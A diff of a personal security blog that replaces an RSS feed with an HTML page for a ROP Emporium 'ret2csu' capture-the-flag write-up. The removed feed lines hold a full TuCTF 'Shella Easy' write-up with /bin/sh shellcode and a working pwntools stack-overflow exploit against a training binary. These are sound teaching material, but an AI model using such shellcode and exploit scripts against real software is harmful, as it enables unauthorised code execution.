@@ -1,5 +1,70 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anubis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anubis</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Thu, 12 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>ROP Emporium :: RET2CSU</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
-$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content>
+<meta name=description content="ROP Emporium 'ret2csu' challenge.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>
+<title>
+ROP Emporium :: RET2CSU :: Anubis
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
+<meta itemprop=name content="ROP Emporium :: RET2CSU">
+<meta itemprop=description content="ROP Emporium 'ret2csu' challenge."><meta itemprop=datePublished content="2021-08-12T00:00:00+00:00">
+<meta itemprop=dateModified content="2021-08-12T00:00:00+00:00">
+<meta itemprop=wordCount content="1498"><meta itemprop=image content="https://anvbis.github.io">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://anvbis.github.io">
+<meta name=twitter:title content="ROP Emporium :: RET2CSU">
+<meta name=twitter:description content="ROP Emporium 'ret2csu' challenge.">
+<meta property="og:title" content="ROP Emporium :: RET2CSU">
+<meta property="og:description" content="ROP Emporium 'ret2csu' challenge.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://anvbis.github.io/posts/rop-emporium-ret2csu/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-08-12T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-08-12T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
+<meta property="article:section" content="Linux">
+<meta property="article:section" content="Return Oriented Programming">
+<meta property="article:section" content="Capture the Flag">
+<meta property="article:published_time" content="2021-08-12 00:00:00 +0000 UTC">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>anvbis</span>
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=/posts>Blog</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+</p>
+</div>
+<article>
+<h2 class=post-title><a href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>ROP Emporium :: RET2CSU</a></h2>
+<div class=post-content>
+<h2 id=reverse-engineering>Reverse Engineering</h2>
 <p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
 <pre><code>$ file ./ret2csu
 ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
@@ -70,7 +135,7 @@ Thank you!
       0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
       0x00000ae6      bf01000000     mov edi, 1                  ; int status
       0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
-</code></pre><h2 id="information-gathering">Information Gathering</h2>
+</code></pre><h2 id=information-gathering>Information Gathering</h2>
 <p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
 <p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
 <pre><code>#!/usr/bin/env python3
@@ -158,7 +223,7 @@ Non-debugging symbols:
 
 [INFO] File: ./ret2csu
 0x00000000004006a3: pop rdi; ret;
-</code></pre><h2 id="exploit-development">Exploit Development</h2>
+</code></pre><h2 id=exploit-development>Exploit Development</h2>
 <p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
 <ul>
 <li>Overwrite the return address in the <code>pwnme</code> function.</li>
@@ -255,173 +320,22 @@ log.success('Flag: ' + r.readline().decode('utf-8'))
 [+] Starting local process './ret2csu': pid 1110
 [+] Flag: ROPE{a_placeholder_32byte_flag!}
 [*] Process './ret2csu' stopped with exit code 0 (pid 1110)
-</code></pre>]]></content></item><item><title>TuCTF 2018 :: Shella Easy</title><link>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</link><pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/tuctf-2018-shella-easy/</guid><description>Reverse Engineering From the file command we can see that it is a dynamically linked linux executable.
-$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped Running checksec on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
-<p>From the <code>file</code> command we can see that it is a dynamically linked linux executable.</p>
-<pre><code>$ file shella-easy
-shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
-</code></pre><p>Running <code>checksec</code> on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).</p>
-<pre><code>$ checksec ./shella-easy
-[*] './shella-easy'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x8048000)
-    RWX:      Has RWX segments
-</code></pre><p>This means a few things for us:</p>
-<ul>
-<li>We know where everything is stored inside the binary.</li>
-<li>We can execute arbitrary shellcode on the stack.</li>
-<li>A stack overflow can give us control over program execution.</li>
-</ul>
-<p>Running <code>shella-easy</code> shows that the binary (at some point) takes user input. We&rsquo;ll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.</p>
-<pre><code>$ ./shella-easy
-I'll have a 0xffc40780 with a side of fries thanks
-asdfasdf
-</code></pre><p>Reversing the <code>main</code> function of the binary reveals that it uses <code>gets</code> to take user input. As we suspected, this is likely where we can exploit this.</p>
-<pre><code>0x08048532      83c408         add esp, 8
-0x08048535      8d45b8         lea eax, [s]
-0x08048538      50             push eax                    ; char *s
-0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
-</code></pre><p>Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable <code>var_8h</code> is not set to <code>0xdeadbeef</code>, the binary will immediately exit (instead of returning and giving us control).</p>
-<pre><code>    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
-┌─&lt; 0x08048548      7407           je 0x8048551
-│   0x0804854a      6a00           push 0                      ; int status
-│   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
-└─&gt; 0x08048551      b800000000     mov eax, 0
-    0x08048556      8b5dfc         mov ebx, dword [var_4h]
-    0x08048559      c9             leave
-    0x0804855a      c3             ret
-</code></pre><p>We can also see that this variable <code>var_8h</code> is initially set to a value of <code>0xcafebabe</code> higher up in the instruction stream.</p>
-<pre><code>0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
-</code></pre><p>We&rsquo;ll want to find out where <code>var_8h</code> is stored relative to where our input <code>s</code> is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).</p>
-<p>Radare tells us a little about where these variables are supposed to be stored (in the <code>main</code> function header), but we&rsquo;ll want to verify this later.</p>
-<pre><code>; var char *s @ ebp-0x48
-; var uint32_t var_8h @ ebp-0x8
-; var int32_t var_4h @ ebp-0x4
-</code></pre><p>We can see that the <code>var_8h</code> is stored below our input buffer <code>s</code> on the stack, this is good for us as we can overwrite its value when we perform our overflow.</p>
-<p>A quick calculation <code>0x48 - 0x8 = 0x40 = 64</code> tells us that <code>var_8h</code> is stored 64 bytes after the start of our input buffer.</p>
-<h2 id="information-gathering">Information Gathering</h2>
-<p>First, let&rsquo;s spin up GDB and verify the location of <code>var_8h</code> relative to our input buffer <code>s</code>.</p>
-<p>We&rsquo;ll set a breakpoint just after the <code>gets</code> call so we can see what the stack looks like just after we&rsquo;ve provided the binary with input.</p>
-<pre><code>pwndbg&gt; disassemble main
-Dump of assembler code for function main:
-
-...
-
-   0x08048539 &lt;+94&gt;:    call   0x8048390 &lt;gets@plt&gt;
-   0x0804853e &lt;+99&gt;:    add    esp,0x4
-   0x08048541 &lt;+102&gt;:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
-   0x08048548 &lt;+109&gt;:   je     0x8048551 &lt;main+118&gt;
-   0x0804854a &lt;+111&gt;:   push   0x0
-   0x0804854c &lt;+113&gt;:   call   0x80483a0 &lt;exit@plt&gt;
-   0x08048551 &lt;+118&gt;:   mov    eax,0x0
-   0x08048556 &lt;+123&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
-   0x08048559 &lt;+126&gt;:   leave  
-   0x0804855a &lt;+127&gt;:   ret    
-
-...
-
-pwndbg&gt; b *0x0804853e
-Breakpoint 1 at 0x804853e
-</code></pre><p>We can now run the binary inside GDB and we&rsquo;ll give it the value <code>AAAA</code> when it prompts us for input, so we can easily see where our input is stored inside the stack.</p>
-<pre><code>pwndbg&gt; r
-Starting program: ./shella-easy 
-Yeah I'll have a 0xffffcff0 with a side of fries thanks
-AAAA
-
-Breakpoint 1, 0x0804853e in main ()
-
-...
-</code></pre><p>After dumping the relevant part of the stack, we can verify the location of <code>var_8h</code> relative to <code>s</code> with a simple calculation; <code>0xffffd030 - 0xffffcff0 = 64</code>.</p>
-<pre><code>pwndbg&gt; x/20x $ebp-0x48
-0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
-0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
-0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
-0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
-0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
-</code></pre><p>While we&rsquo;re at this breakpoint, we can also take a look at what the binary is leaking. Yep, it&rsquo;s definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.</p>
-<pre><code>pwndbg&gt; x/x 0xffffcff0
-0xffffcff0:     0x41414141
-</code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
-<p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
-<pre><code>#!/usr/bin/env python3
-
-from pwn import *
-
-
-pad = b'A'*64
-var = p32(0xdeadbeef)
-
-r = process('./shella-easy')
-gdb.debug(r)
-
-r.writeline(pad + var + cyclic(64))
-r.interactive()
-</code></pre><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
-<pre><code>pwndbg&gt; p $eip
-$1 = (void (*)()) 0x61616163
-</code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
-<pre><code>In [2]: cyclic_find(0x61616163)
-Out[2]: 8
-</code></pre><h2 id="exploit-development">Exploit Development</h2>
-<p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
-<p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
-<pre><code>.global _start
-
-_start:
-.intel_syntax noprefix
-shell:
-    push 0x0068732f     # &quot;/sh&quot;
-    push 0x6e69622f     # &quot;/bin&quot;
-    mov ebx, esp        # &quot;/bin/sh&quot;
-    mov ecx, 0
-    mov edx, 0
-    mov eax, 11
-    int 0x80            # execve(&quot;/bin/sh&quot;, 0, 0)
-exit:
-    mov ebx, 0          # exit code
-    mov eax, 0
-    int 0x80            # exit(0)
-</code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
-<pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
-$ objcopy --dump-section .text=payload shellcode
-</code></pre><pre><code>In [1]: open('payload','rb').read()
-Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
-</code></pre><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
-<ul>
-<li>Capture the leaked stack address.</li>
-<li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
-<li>Overwrite the return address using the leak.</li>
-<li>Get code execution.</li>
-</ul>
-<pre><code>#!/usr/bin/env python3
-
-from pwn import *
-
-
-buf = b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
-
-pad = b'A'*(64 - len(buf))
-var = p32(0xdeadbeef)
-off = b'A'*8
-
-r = process('./shella-easy')
-#gdb.attach(r)
-
-# capture the leaked stack address
-r.readuntil('Yeah I\'ll have a ')
-leak = p32(eval(r.read(10)))
-r.clean()
-
-# send our payload to the binary
-r.writeline(buf + pad + var + off + leak)
-r.interactive()
-</code></pre><p>And finally, here&rsquo;s the exploit in action.</p>
-<pre><code>./exploit.py 
-[+] Starting local process './shella-easy': pid 3768
-[*] Switching to interactive mode
-$ cat flag.txt
-TuCTF{Shella Easy}
-</code></pre>]]></content></item></channel></rss>
+</code></pre>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/return-oriented-programming/>Return Oriented Programming</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/capture-the-flag/>Capture the Flag</a></span>
+</p>
+</div>
+</main>
+</div>
+<footer class=footer>
+</footer>
+</div>
+<script type=text/javascript src=/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js integrity="sha512-cvPNsXV+ZUxaoTKaQmnqao17N1E947nVTXpcolVz+zpk+HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+</body>
+</html>
